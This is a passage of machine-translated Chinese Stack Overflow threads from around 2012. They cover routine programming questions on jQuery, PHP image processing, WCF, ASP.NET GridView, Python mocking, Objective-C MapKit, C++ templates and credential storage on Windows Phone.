使用以下方法保存其他会话中的数据可能更容易：

```
save.image("C:/Users/Desktop/example_candelete.RData") 
```

然后将其加载到您的 MD 文件中：

```
load("C:/Users/Desktop/example_candelete.RData") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-09-14T12:44:18.680

[**Markdownreports 包**](https://markdownreports.github.io/)专为动态解析 Markdown 文档而设计。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-19T09:53:23.323

正如 Julien Colomb 评论的那样，我发现在这种情况下最好的办法是保存大对象，然后在我定制降价时显式加载它们。如果您的数据来自 ODBC，并且您不想在修改字体和主题时重复运行整个查询，那么这是必须的。

# php - 如何使用 jQuery 重新调整大小和裁剪 (jrac) 上传图像

> ID：11155186
> 
> 赞同：0
> 
> 时间：2012-06-22T11:18:48.113
> 
> 标签：php, jquery, upload, resize, crop

请帮帮我，我需要使用[jrac](https://github.com/trepmag/jrac)或一些 jQuery 插件，然后使用 PHP 上传。使用 jrac 我只能重新调整大小和裁剪，我被困在上传中。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-04T07:10:05.207

您首先必须根据新的宽度和高度调整它的大小，而不是选择新图像的裁剪部分。我有代码。你还需要这个吗？

# c++ - 在 Visual Studio 2012 上使用 Direct X June 2010 SDK 进行编译

> ID：11155191
> 
> 赞同：0
> 
> 时间：2012-06-22T11:19:05.900
> 
> 标签：c++, directx, windows-8

我想使用 2010 年 6 月的 SDK 而不是 Windows 8 SDK 在 Windows 8 Release Candidate 上的 Visual Studio 2012 中编译我的 DirectX 代码。

问题在于，由于 DirectX 8 SDK 与 Windows SDK 在同一个文件夹中，我不知道我可以更改哪些包含/库文件夹。

就目前而言，似乎我在目录设置或链接器设置中所做的任何更改都没有解决涉及 Windows 8 SDK 的问题，这会导致一堆重新定义警告等。

有没有人能让这个工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T23:23:52.340

不确定这是最简单的方法，但我最终安装了 VS2010 并以这种方式编译。

附带说明一下，DirectX 2010 年 6 月 SDK 无法正确安装（可能是由于 Windows 8 的原因），但它`\program files`在完成后会保持文件夹完好无损——因此所有 .libs 和 .hs 都可以使用。

# jquery - 如何延迟 mouseout 功能？

> ID：11155196
> 
> 赞同：0
> 
> 时间：2012-06-22T11:19:19.147
> 
> 标签：jquery, timeout

我有这个代码：

```
 var shortcuts = $('#geo_shortcuts');
    shortcuts.find('li').hoverIntent(
        function () {
            // Open the Panel
            $(this).find('.geo_shortcuts_content').stop().animate({
                top: '-122'
            }, 300);
        },
        function () {
            //Close de Panel
            $(this).find('.geo_shortcuts_content').stop().animate({
                top: '0'
            }, 400);
        }
    ); 
```

如何在鼠标悬停 2 秒后只允许关闭面板？我知道我应该做一个 settimeout 功能，但我不知道怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:25:04.560

尝试使用[`delay()`](http://api.jquery.com/delay/)方法：

```
$(this).find('.geo_shortcuts_content').stop().delay(2000).animate({
    top: '0'
}, 400); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:25:02.593

您可以使用计时器来执行此操作

```
hideDelayTimer = null;
    shortcuts.find('li').hoverIntent(
        function () {
            // Open the Panel
            clearTimeout(hideDelayTimer);
            $(this).find('.geo_shortcuts_content').stop().animate({
                top: '-122'
            }, 300);
        },
    function () {
        //Close de Panel
        clearTimeout(hideDelayTimer);
        hideDelayTimer = setTimeout(function () {
            hideDelayTimer = null;
                $(this).find('.geo_shortcuts_content').stop().animate({
                    top: '0'
                }, 400);
        }, 2000); 
```

祝你今天过得愉快

# php - PHP GD & Imagick - 有没有办法衡量图像处理进度？

> ID：11155199
> 
> 赞同：2
> 
> 时间：2012-06-22T11:19:36.777
> 
> 标签：php, imagemagick, gd, imagick

我的应用程序的一部分包括大量使用具有裁剪、调整大小、过滤器、亮度等功能的图像处理。

在进行图像处理时，是否可以测量 GD 和/或 ImageMajick 的进度？我希望能够通过以下方式呈现进度条客户端：-

1.  有关操作的详细信息在客户端收集并发布到服务器
2.  在 POST 上，从 0% 开始呈现客户端。
3.  服务器运行 GD 或 Imagick 并处理图像，在此期间它将进度更新数据返回给客户端。
4.  进度条的进度宽度是用javascript改变的，以反映返回的进度数据。
5.  最终，当图像处理过程完成时，新的文件名被发送回客户端并且标签的 src 被更新。
6.  在图像上检测到 onload 事件，最后在渲染后，进度条达到 100% 并向用户显示图像。

如果没有可能从 GD 或 Imagick 检索进度数据的方法，任何人都可以提出一种“伪造”的方法吗？

我考虑过在 POST 之前渲染一个空的进度条，一旦操作发生并且客户端接收到 ajax 响应，就将其设置为 70%。然后通过检测 onload 事件在新图像完全加载后最终动画到 100%。

如果这是我唯一的选择，那就这样吧。但这对我来说感觉相当“笨拙”。

有任何想法吗？

**编辑**- 我刚刚看到 ImageMajick 的命令行版本具有返回进度的选项“-monitor”，所以我可以通过每 50 毫秒左右轮询一次来敲出一些东西。GD 有什么类似的东西，但是我们根据所需的操作同时使用 GD/Imagick。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T23:44:18.697

也许您可以使用侦听器和事件的集合来识别源进度，然后通知客户端。

您可以使用[React](https://github.com/react-php/react)或纯 lib 事件来使此进度异步。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-14T03:56:56.717

没错，如果将 ImageMagick 与 exec 一起使用，您可以添加`-monitor`选项，在后台运行命令并将输出发送到文件

```
convert opts -monitor > /path/to/progress.txt 2>/path/to/progress.txt & 
```

然后定期读取该文件。

您也可以使用`Imagick`扩展包装器并使用 `Imagick::setProgressMonitor`. 结合 HTML5 服务器发送的事件会很好。

```
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');

$callback = function($offset, $span){

    echo "data: ".(100 * $offset) / $span."\n\n";
    flush();
    return true;
}

$imagick->setProgressMonitor($callback);
$imagick->waveImage(2, 15); 
```

# wcf - WCF 服务应用程序不适用于集成管道模式下的应用程序池

> ID：11155204
> 
> 赞同：3
> 
> 时间：2012-06-22T11:19:53.013
> 
> 标签：wcf, iis, svc

我正在运行 Windows Server 2012 Release Candidate。出于测试目的，我从 VS 模板部署了 WCF 服务应用程序，而没有在默认网站上进行修改。仅当应用程序池处于经典管道模式而不是集成模式时，检索 Service1.svc 才有效。如果我切换到集成模式，我会收到 HTTP-Error 404.17 - Not Found。

*.svc 扩展名的 aspnet_isapi.dll 的 Isapi 处理程序也注册为 32 位和 64 位。该服务以经典模式工作。所以处理程序注册似乎部分正确。

我已经尝试将“启用 32 位应用程序”设置为 True。将应用程序部署为 32 位或 64 位也没有区别。

我错过了什么？

# c# - Gridview updatecommand 不适用于 2 字数据库列

> ID：11155208
> 
> 赞同：0
> 
> 时间：2012-06-22T11:20:31.250
> 
> 标签：c#, asp.net, sql-server, gridview, updatecommand

这是gridview updatecommand的工作版本

```
 <asp:SqlDataSource ID="MatchDataSource" runat="server" SelectCommand="SELECT * FROM [dbo].[SYR1]"
        UpdateCommand="UPDATE [dbo].[SYR1] SET Fname = @Fname
        WHERE ID=@ID 
    ConnectionString="<%$ ConnectionStrings:ApplicationServices %>">
        <UpdateParameters>
            <asp:Parameter Type="String" Name="Fname" />
            <asp:Parameter Type="String" Name="Lname" />
            <asp:Parameter Type="String" Name="ID" />
        </UpdateParameters>
    </asp:SqlDataSource>

<Columns>
    <asp:CommandField ShowEditButton="True"></asp:CommandField>
    <asp:BoundField ReadOnly="true" HeaderText="First Name"  DataField="fname" SortExpression="fname"><ItemStyle HorizontalAlign="Right"></ItemStyle></asp:BoundField>
    <asp:BoundField ReadOnly="false" HeaderText="Last Name" DataField="lname"    SortExpression="lname"><ItemStyle HorizontalAlign="Right"></ItemStyle> </asp:BoundField>
</Columns> 
```

我遇到的问题是我有两个名称的数据库列，即我有“名字”而不是“fname”。数据字段很好，将采用 2 个单词的列名

```
<asp:BoundField ReadOnly="true" HeaderText="First Name"  DataField="First Name" SortExpression="fname"><ItemStyle HorizontalAlign="Right"></ItemStyle></asp:BoundField> 
```

问题是我无法保存 2 字参数，所以我不确定如何让更新工作......下面是一个不成功的尝试。任何人都可以帮我解决它。

```
UpdateCommand="UPDATE [dbo].[SYR1] SET [First Name] = @First name
        WHERE ID=@ID 
    ConnectionString="<%$ ConnectionStrings:ApplicationServices %>">
        <UpdateParameters>
            <asp:Parameter Type="String" Name="First Name" />
            <asp:Parameter Type="String" Name="Last Name" />
            <asp:Parameter Type="String" Name="ID" />
        </UpdateParameters> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:29:40.577

请参阅规则链接 [http://msdn.microsoft.com/en-us/library/aa223962.aspx](http://msdn.microsoft.com/en-us/library/aa223962.aspx)

**不允许嵌入空格或特殊字符。**

更改参数名称：

```
UpdateCommand="UPDATE [dbo].[SYR1] SET [First Name] = @FirstName
        WHERE ID=@ID 
    ConnectionString="<%$ ConnectionStrings:ApplicationServices %>">
        <UpdateParameters>
            <asp:Parameter Type="String" Name="FirstName" />
            <asp:Parameter Type="String" Name="LastName" />
            <asp:Parameter Type="String" Name="ID" />
        </UpdateParameters> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:30:17.017

**解决方案一**

```
UpdateCommand="UPDATE [dbo].[SYR1] SET [First Name] = @First name
        WHERE ID=@ID 
    ConnectionString="<%$ ConnectionStrings:ApplicationServices %>">
        <UpdateParameters>
            <asp:Parameter Type="String" Name="[First Name]" />
            <asp:Parameter Type="String" Name="[Last Name]" />
            <asp:Parameter Type="String" Name="ID" />
        </UpdateParameters> 
```

如果它不起作用，那么您可以使用别名，

**解决方案二**

```
Select [First Name] as Fname, ...
from tableName 
```

# tfs - 如果某个 TFS 组/AD 组中的用户进行了更改，TFS 警报？

> ID：11155209
> 
> 赞同：1
> 
> 时间：2012-06-22T11:20:32.463
> 
> 标签：tfs, tfs-alerts

我正在尝试设置一个警报，当具有“仅查看工作项”访问权限的人创建/更改工作项时，该警报将向我发送一封电子邮件。

我可以创建一个查询，返回由 WIOV 用户创建的工作项列表，方法是使用“创建者（在组中）“[TEAM FOUNDATION]\Work Item Only View Users”，或者我使用的 AD 组创建了哪些控制哪些用户具有 WIOV 访问权限。

但是警报资源管理器中似乎没有“组内”运算符。

有没有其他方法可以实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:42:03.877

如果给定用户是组的成员，则您无法签入警报规则，因此您将无法这样做。

也许后备方案是要求您的 wiov 用户创建工作项而不是将它们分配给某人（让分配给字段为空），然后您可以创建在创建此类工作项时触发的警报。

注意：您可能必须更改工作项的定义以允许空的“分配给”（取决于您使用的流程模板）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-13T15:01:48.133

我知道我迟到了，但你可以用不同的方式来做这件事。在 TFS 中创建一个新项目团队并将您的特定用户/AD 组添加到该项目团队。然后，仅为该特定项目团队设置警报。

# python - 如何使用 Mock 库修补 Python 类

> ID：11155210
> 
> 赞同：3
> 
> 时间：2012-06-22T11:20:32.320
> 
> 标签：python, unit-testing, mocking, scrapy, python-mock

我无法为我的测试修补课程。我正在尝试修补属于 Scrapy 的东西——一个[HtmlXpathSelector](http://scrapy.readthedocs.org/en/latest/topics/selectors.html?highlight=HtmlXPath#scrapy.selector.HtmlXPathSelector)类。

这是一些代码：

```
from scrapy.selector import HtmlXPathSelector
from mock import MagicMock, patch

with patch('scrapy.selector.HtmlXPathSelector') as MockHtml:
    instance = MockHtml.return_value
    instance.method.return_value = 'foo'
    example = HtmlXPathSelector()
    print type(example)
    assert example is instance
    assert example.method == 'foo' 
```

结果是：

```
<class 'scrapy.selector.lxmlsel.HtmlXPathSelector'>
Traceback (most recent call last):
  File "<stdin>", line 6, in <module>
AssertionError
>>> 
```

此示例与 Mock 库教程中的示例几乎相同。知道为什么它不起作用吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-22T11:45:11.373

您不应该修补已在当前测试代码中导入的类。相反，您需要修补相应模块中的类（您要测试）。因此，如果`HtmlXPathSelector`在 中导入`mymodule`，您将修补为：

```
with patch('mymodule.HtmlXPathSelector') as MockClass:
    ... 
```

有关更多详细信息，请参阅[修补位置](https://docs.python.org/dev/library/unittest.mock.html#where-to-patch)。

**编辑**如果你真的需要这个，你可以在当前模块中修补一个类：

```
with patch('__main__.Class') as MockClass: 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:01:05.123

您的代码示例存在两个问题。第一个是您已经从 scrapy 模块导入了 HtmlXPathSelector，然后您在事后更改了该名称。而是导入选择器，并从那里使用名称：

```
from scrapy import selector
from mock import MagicMock, patch

with patch('scrapy.selector.HtmlXPathSelector') as MockHtml:
    instance = MockHtml.return_value
    instance.method.return_value = 'foo'
    example = selector.HtmlXPathSelector()
    print type(example)
    assert example is instance
    assert example.method() == 'foo' 
```

另一个问题是您的最后一行正在检查`method`，当它需要调用该方法时`method()`。

# objective-c - MapView 中的注解

> ID：11155211
> 
> 赞同：0
> 
> 时间：2012-06-22T11:20:33.827
> 
> 标签：objective-c, xcode

我有这个代码：

```
-(void)handleLongPressGesture:(UIGestureRecognizer*)sender {

NSNumber* existingpoints = [[NSNumber alloc]init];

 existingpoints =[NSNumber numberWithInt:0]; 

// This is important if you only want to receive one tap and hold event
if (sender.state == UIGestureRecognizerStateEnded)
{
    [self.mapView removeGestureRecognizer:sender];
}
else {

    do {
        int z = 1;
        existingpoints =[NSNumber numberWithInt:z];

        // Here we get the CGPoint for the touch and convert it to latitude and longitude coordinates to display on the map
        CGPoint point = [sender locationInView:self.mapView];
        CLLocationCoordinate2D locCoord = [self.mapView convertPoint:point toCoordinateFromView:self.mapView];
        // Then all you have to do is create the annotation and add it to the map

        MKPointAnnotation *annotationPoint = [[MKPointAnnotation alloc] init]; annotationPoint.coordinate = locCoord;

        NSString *latitude = [[NSString alloc] initWithFormat:@"%f",locCoord.latitude];

        NSString *longitude = [[NSString alloc] initWithFormat:@"%f", locCoord.longitude];

        annotationPoint.title = @"Event";
        annotationPoint.subtitle = [NSString stringWithFormat:@"%@ & %@", latitude, longitude];

        [mapView addAnnotation:annotationPoint];

        [[NSUserDefaults standardUserDefaults]setObject:latitude forKey:@"FolderLatitude"];
        [[NSUserDefaults standardUserDefaults]setObject:longitude forKey:@"FolderLongitude"];

    } while ([existingpoints intValue] == 0);

        }
} 
```

...但问题是，当我按住时，然后拖动不止一个针脚。我只想添加一个引脚。所以我尝试了do方法，但它不起作用。我无法理解，因为当我执行代码时，我将 NSNumber 的值变为 1，而 while 说 = 0 来运行代码。

请帮忙！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T17:28:11.033

您当前的代码很容易出现大量内存泄漏。例如：

```
NSNumber* existingpoints = [[NSNumber alloc] init];
existingpoints = [NSNumber numberWithInt:0]; 
```

泄漏是因为您将第一个实例`existingpoints`保留为 1 而没有在任何地方释放它。除非你使用 ARC。您只需一条指令即可优化上述代码：

```
NSNumber* existingpoints = [NSNumber numberWithInt:0]; 
```

如果您需要将它保存在某个地方，请保留它（但我相信事实并非如此）。

分析代码，我建议不要将现有点用作`NSNumber`. 使用 an`NSInteger`代替（它不是一个对象，只是一个 typedef to `long`）。

这是我重写的代码：

```
-(void)handleLongPressGesture:(UIGestureRecognizer*)sender {
    NSInteger existingpoints = 0;

    // This is important if you only want to receive one tap and hold event
    if (sender.state == UIGestureRecognizerStateEnded) {
        [self.mapView removeGestureRecognizer:sender];
    }
    else {
        do {
            int z = 1;
            existingpoints = z;

            // Here we get the CGPoint for the touch and convert it to latitude and longitude coordinates to display on the map
            CGPoint point = [sender locationInView:self.mapView];
            CLLocationCoordinate2D locCoord = [self.mapView convertPoint:point toCoordinateFromView:self.mapView];

            // Then all you have to do is create the annotation and add it to the map
            MKPointAnnotation *annotationPoint = [[MKPointAnnotation alloc] init];
            annotationPoint.coordinate = locCoord;

            NSString *latitude = [NSString stringWithFormat:@"%f",locCoord.latitude];
            NSString *longitude = [NSString stringWithFormat:@"%f", locCoord.longitude];

            annotationPoint.title = @"Event";
            annotationPoint.subtitle = [NSString stringWithFormat:@"%@ & %@", latitude, longitude];

            [mapView addAnnotation:annotationPoint];

            [[NSUserDefaults standardUserDefaults] setObject:latitude forKey:@"FolderLatitude"];
            [[NSUserDefaults standardUserDefaults] setObject:longitude forKey:@"FolderLongitude"];

            [annotationPoint release]; // Remove this if you're using ARC.
        } while (existingpoints == 0);
    }
} 
```

请注意，我还更改了使用 ARC 时创建`latitude`和`longitude`不创建任何内存泄漏的代码。

编辑：进一步分析您的代码，我不明白为什么这种方法会一次丢弃两个引脚。也许您可以检查您的方法是否没有被调用两次？

更多：如果你只想运行一次，为什么还要有一个 do/while 循环？（但也许你只是在为更进一步的发展铺平道路）

# javascript - 修复有问题的布局/如何获取元素高度？

> ID：11155213
> 
> 赞同：0
> 
> 时间：2012-06-22T11:20:36.910
> 
> 标签：javascript, html, css

**这个问题与我之前的问题有关：** [position relative elements after absolute elements](https://stackoverflow.com/questions/11152274/position-relative-elements-after-absolute-elements)

我更新了那里提供的 JsFiddle 以更准确地反映我当前的 html（我现在没有 URL）。见这里：http: [//jsfiddle.net/dkxUX/22/](http://jsfiddle.net/dkxUX/22/)

我意识到这种布局对我来说是有问题的。

在对 ov 的回答的评论中，他指出我可以创建额外的包装器，例如 #header div。这确实不是一个坏主意，因为这样我仍然可以在其中绝对定位我的元素 - 只要它定位在静态之外的任何其他位置。

**我的问题来了：**

我很好奇绝对定位元素的高度是否会影响其父元素的高度。实际上，似乎不是：http: [//jsfiddle.net/qFh6s/1/](http://jsfiddle.net/qFh6s/1/)

我很沮丧，我用 jQuery 尝试过：http: [//jsfiddle.net/WD6LF/1/](http://jsfiddle.net/WD6LF/1/)

结果：变得更加沮丧，没有想法。

我只是不能给元素固定高度，因为它们的内容会有所不同。

实际上，我已经对我的 html 感到恼火，例如，粘性页脚的附加包装器使我看起来不那么语义化。此外，我开始明白将所有内容放入 div 并为其赋予绝对位置并不是所有 CSS 障碍的答案。因此，我愿意接受任何有用的建议，同时让自己准备好从头开始一切并重新开始。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:43:21.987

你真的应该看看花车。即使高度未知，浮动也会帮助您定位元素。你会停止发誓...... :)

优秀的设计师不使用表格或定位，他们使用浮动。如果您不希望它跟随任何其他 div，您可以在任何 div 上使用 clear:both。我没有完全阅读您的问题，但我很确定您正在寻找它的浮动。[这](http://www.w3schools.com/css/css_float.asp)是关于花车的快速教程。通过它，您自己将能够解决您的问题。我希望你的问题得到解决。设计愉快！！

# android - developer.android 上的示例代码中的问题

> ID：11155214
> 
> 赞同：0
> 
> 时间：2012-06-22T11:20:42.657
> 
> 标签：android

资源部分中有一些示例代码，解释了一些示例，现在已经消失了。即[http://developer.android.com/resources/samples/TicTacToeMain/index.html](http://developer.android.com/resources/samples/TicTacToeMain/index.html)

当点击它们时，它会带你到[http://developer.android.com/tools/samples/index.html](http://developer.android.com/tools/samples/index.html) 关于这个有什么帮助吗？

已编辑：问题 >>> [http://code.google.com/p/android/issues/detail?id=33495](http://code.google.com/p/android/issues/detail?id=33495)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:31:13.973

您可以从该链接[http://developer.android.com/tools/samples/index.html](http://developer.android.com/tools/samples/index.html)下载示例，然后按照以下步骤使其在 Eclipse 上运行：

文件 -> 新建 -> Android 项目 -> 从现有示例创建项目 -> 选择版本（您已经下载了示例） -> 选择示例。

通过这种方式，您可以导入 android 提供的示例参考程序，它将帮助您更好地掌握它的 API。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:32:52.043

如果您正在寻找井字游戏教程，本系列教程可能会帮助您关注[http://www.androiddom.com/2011/05/introducing-tic-tac-toe-tutorial.html](http://www.androiddom.com/2011/05/introducing-tic-tac-toe-tutorial.html)

# python - ImportError：无法导入名称 random_integers

> ID：11155223
> 
> 赞同：3
> 
> 时间：2012-06-22T11:21:14.590
> 
> 标签：python, numpy, importerror

我有一个包含以下行的序言的 Python 代码：

```
from numpy import array,arccosh,random_integers 
```

稍后在我（成功）使用的代码中`array`和`arccosh`. 但是，运行程序时出现错误：

```
from numpy import array,arccosh,random_integers
ImportError: cannot import name random_integers 
```

任何人都可以帮忙吗？谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T22:12:28.883

我没有使用 NumPy 的经验，但快速的 Google 搜索告诉我它`random_ingegers`实际上是在`numpy.random`. 所以`from numpy.random import random_integers`，也许？

# jquery - 从单选按钮获取价值的最佳方法

> ID：11155224
> 
> 赞同：2
> 
> 时间：2012-06-22T11:21:18.757
> 
> 标签：jquery, html

```
 <input type="radio" name="group1" value="Milk"> Milk<br>
    <input type="radio" name="group1" value="Butter"> Butter

$("????").change(function(){
   alert($(this).val());
}) 
```

从一个名称的两个输入中获取当前检查值的最佳方法是什么？如果我点击收音机牛奶，那么这应该显示“牛奶”等。我可以为此添加类并显示当前值，但这是最好的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-22T11:23:48.637

您可以使用名称，该名称也可用作多个单选按钮的组。我们可以使用类型，但它会将事件绑定到页面上的所有单选按钮。

```
$('input[name=group1]').change(function(){
   alert($(this).val());
}) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-22T11:22:49.203

像这样：**工作演示** [http://jsfiddle.net/VtcPB/1/](http://jsfiddle.net/VtcPB/1/)

好读：[http ://api.jquery.com/attribute-equals-selector/](http://api.jquery.com/attribute-equals-selector/)

也像@Casper所说的`group`使用：`$('input[name ="group1"]')` **演示** [http://jsfiddle.net/VtcPB/2/](http://jsfiddle.net/VtcPB/2/)

或者更优化的[http://jsfiddle.net/VtcPB/3/](http://jsfiddle.net/VtcPB/3/) 使用`this.value`而不是`$(this).val()`

或者另一个更准确的**演示**：http: [//jsfiddle.net/VtcPB/4/](http://jsfiddle.net/VtcPB/4/)

希望这可以帮助

**代码**

```
$("input:radio[name=group1]").click(function() {
    alert($(this).val());
});​ 
```

**或者**

```
$('input[name ="group1"]').on('change',function(){
   alert(this.value);
})​ 
```

**或者**

```
$('input[type="radio"]').on('change',function(){
   alert($(this).val());
})​ 
```

**或者**

```
 <input type="radio" name="group1" value="Milk"> Milk<br>
    <input type="radio" name="group1" value="Butter"> Butter

$('input[type="radio"]').change(function(){
   alert($(this).val());
}) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T11:46:27.423

无线电类型输入的另一种方法：

```
$('input:radio[name=group1'].change(function()
{
    alert($(this).val());
} 
```

# java - 在构造函数中访问另一个类的公共变量

> ID：11155226
> 
> 赞同：0
> 
> 时间：2012-06-22T11:21:25.230
> 
> 标签：java

我有C1级和C2级。C1 有一个公共布尔变量 b1。

b1 的值在 C1 中设置，然后我在 C1 中创建 C2 类的对象。即在C1我有：

```
b1 = true; 
C2 c2 = new C2(); 
```

现在在 C2 的构造函数中，我想根据 b1 的值做出决定。如何在 C2 的构造函数中访问 b1 的值（它是 C1 类的变量）？C2 的构造函数不能有任何争论。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:24:46.133

如果 C2 类被定义为 C1 的内部类，您可以像这样访问它的外部类：

```
C1.this.b1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:44:20.510

有几种方法可以做到这一点。您也可以将 b1 设为静态，@Logard 建议的内容，或者 C1 可以设为单例：

```
public enum C1{
    INSTANCE;

    public boolean b1=false;  

}

public class C2{

    public C2(){
        System.out.println(C1.INSTANCE.b1);
    }

} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-22T11:30:13.733

在 C2 中创建 C1 的对象，然后检查。

`boolean check=new C1().b1`

# jquery - JQUERY - 在图像末尾停止滑块

> ID：11155228
> 
> 赞同：0
> 
> 时间：2012-06-22T11:21:34.627
> 
> 标签：jquery, slider

我将此插件用于滑块

网站 > [http://basic-slider.com/documentation/](http://basic-slider.com/documentation/) 脚本 > [https://github.com/jcobb/basic-jquery-slider/blob/807132214df170e1726e05f272fb75649687f268/js/basic-jquery-slider.js](https://github.com/jcobb/basic-jquery-slider/blob/807132214df170e1726e05f272fb75649687f268/js/basic-jquery-slider.js)

基本配置是带有循环滑块，在图像末尾没有停止。是否可以更改/编辑相同的参数以允许这样做？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:46:19.047

明显不是

```
defaults = {
// Width + Height used to ensure consistency
                width: 700,
                height: 300,
// The type of animation (slide or fade)
                animation: 'fade',
                // The duration in ms of the transition between slides
                animationDuration: 450,
                // Automatically rotate through the slides
automatic: true,
// Delay in ms between auto rotation of the slides
                rotationSpeed: 4000,
// Pause the slider when any elements receive a hover event
                hoverPause: true,
// Show the manual slider controls
                showControls: true,
// Center the controls vertically
                centerControls: true,
// Text to display in next/prev buttons
                nextText: 'Next',
                prevText: 'Prev',
// Show positional markers
                showMarkers: true,
// Center the positional indicators
                centerMarkers: true,
// Allow navigation with arrow keys
                keyboardNav: true,
// Use image title text as caption
                useCaptions: true
            } 
```

此外，这不是滑块的想法，您可能应该使用画廊插件或其他东西，也许您会在这里找到一个：http: [//vandelaydesign.com/blog/web-development/jquery-image-galleries/](http://vandelaydesign.com/blog/web-development/jquery-image-galleries/)

# c++ - 从类到整数类型的类型转换

> ID：11155231
> 
> 赞同：1
> 
> 时间：2012-06-22T11:21:41.587
> 
> 标签：c++, templates, types, traits

为了处理一些线性代数问题中的向量和固定/动态分配，我构建了以下类（我不想修改）：

```
// Traits : n is the size of the vector, if -1 : dynamic allocation
template<typename RealType, int n = -1>
struct ClassAVectorTraits
{
  typedef typename LinearAlgebraLibrary::FixedSizeVector<RealType, n> type;
};

template<typename RealType>
struct ClassAVectorTraits<T, -1>
{
  typedef typename LinearAlgebraLibrary::DynamicSizeVector<RealType> type;
};

template<typename RealType>
struct ClassAVectorTraits<T, 1>
{
  typedef typename RealType type;
};

// Implementation
template<typename RealType, int n = -1>
struct ClassA
{
  typedef typename ClassAVectorTraits<RealType, n>::type vector;

  void doSomething( const vector& vec )
    {
      ...
    }
}; 
```

此外，我有一个接口类（我可以修改）：

```
template<typename RealType, int n = -1>
struct UserClass
{
  typedef typename ClassAVectorTraits<RealType, n>::type vector;

  ClassA ca;

  void doSomething( const vector& vec )
    {
      ca.doSomething( vec );
    }

}; 
```

现在我希望用户能够**在输入中给出 STL 向量而不是 LinearAlgebraLibrary 向量**，所以我做了以下操作：

```
// A class to do automatic conversion
template<typename RealType, int n = -1>
struct Field : public ClassAVectorTraits<RealType,n>::type
{
  // Constructor NOT explicit
  Field( const std::vector<RealType>& vec )
    {
      // Copy vec into this (a LinearAlgebraLibrary vector)
    }
}

template<typename RealType>
struct Field<RealType, 1> { }; // Can't derive from integral type : RealType !

// And to classes to tag the solution 
template<typename RealType, int n>
struct USE_LINEAR_ALGEBRA_LIBRARY
{
  typedef typename ClassAVectorTraits<RealType,n>::type vector;
};

template<typename RealType, int n>
struct USE_STL
{
  typedef typename Field<RealType,n> vector;
}; 
```

最后：

```
template<typename RealType, int n = -1, class VectorTag = USE_LINEAR_ALGEBRA_LIBRARY<RealType, n> >
struct UserClass
{
  typedef typename VectorTag::vector vector;

  ClassA ca;

  void doSomething( const vector& vec )
    {
      ca.doSomething( vec );
    }

}; 
```

因此，如果我们使用 USE_STL 标签，就会自动转换：

```
UserClass<double, 2, USE_STL<double, 2> > userClass;
std::vector<double> vecSTL(2, 12.0);

userClass.doSomething( vecSTL ); // vecSTL is converted to LinearAlgebraLibrary::FixedSizeVector<double, 2> 
```

**我的问题**：如何处理`n=1`向量类型是整数类型的情况。如何定义 double (size == 1) 的 STL 向量与 a 之间的隐式转换`double`？

有什么建议么 ？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-24T07:33:22.663

当您即将进行专业化时，您不必遵循通用模板的方案。希望这可以帮助：

```
template<typename RealType>
struct Field<RealType, 1> { 
   typename ClassAVectorTraits<RealType,1>::type value;
   operator ClassAVectorTraits<RealType,1>::type () const { return value; }
   Field(const std::vector<RealType>& vec) 
   {
       if (vec.size() == 1) value = vec[0];
       else throw runtime_error("wrong size");
   }
}; 
```

# windows-phone-7 - 这种保护安全吗？（在 dll 中保存凭据）DPAPI 和 C#

> ID：11155233
> 
> 赞同：0
> 
> 时间：2012-06-22T11:21:57.663
> 
> 标签：windows-phone-7, passwords, dpapi

我正在开发一个管理基本数据的应用程序（在 Windows Phone 7 中）：客户数据（或联系人）和订单

我想保护访问数据库的凭据。我想做以下事情：

**xxx.dll**

我已将凭据放入 dll（已混淆）

**zzz.dll**

在其他 DLL（也被混淆）中，我这样做：

当您安装应用程序时：我读取了 xxx.dll 中的凭据并将它们存储在加密文件中（使用 DPAPI）

在这个 DLL (zzz.dll) 中，我有一个返回解密凭据的函数（使用 DPAPI）。该函数在应用程序中调用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-23T13:08:23.403

市场上的每个免费应用程序都可以下载（例如[http://mktwp7.codeplex.com/](http://mktwp7.codeplex.com/)）和反向工程（例如[http://www.ilspy.net/](http://www.ilspy.net/)）。如果您想将您的凭据存储在代码中的某个位置，那么它是不安全的（如果有人投入了足够的时间）。您将始终只有通过默默无闻的安全性（请参阅[http://en.wikipedia.org/wiki/Security_through_obscurity](http://en.wikipedia.org/wiki/Security_through_obscurity)）。我建议在您的应用中使用没有凭据的代理 (Web) 服务。此服务存储凭据并连接到您的数据库。这样凭证是安全的。

# svn - 更新本地颠覆网络

> ID：11155236
> 
> 赞同：0
> 
> 时间：2012-06-22T11:22:12.343
> 
> 标签：svn, repository

